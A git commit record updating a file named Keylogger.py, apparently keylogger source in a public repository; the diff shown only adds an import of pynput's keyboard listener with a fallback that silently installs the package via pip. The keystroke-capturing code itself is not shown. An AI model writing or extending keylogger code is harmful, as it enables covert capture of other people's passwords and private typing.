5cf772e2ea9402cf9b682b3d9120c188bb5467cc
TheGoldenMine <86381367+TheGhostRoot@users.noreply.github.com>
2023-02-05 15:00:50 +0200

    Update Keylogger.py

--- Keylogger.py
+++ Keylogger.py
@@ -1,4 +1,15 @@
-from pynput.keyboard import Listener, Key
+import os
+
+try:
+    from pynput.keyboard import Listener, Key
+except ImportError:
+    os.system('python -m pip install pynput')
+    os.system('python3 -m pip install pynput')
+    try:
+        from pynput.keyboard import Listener, Key
+    except ImportError:
+        print("You need pythom and pynput")
+        exit()
 
 keys = []
 
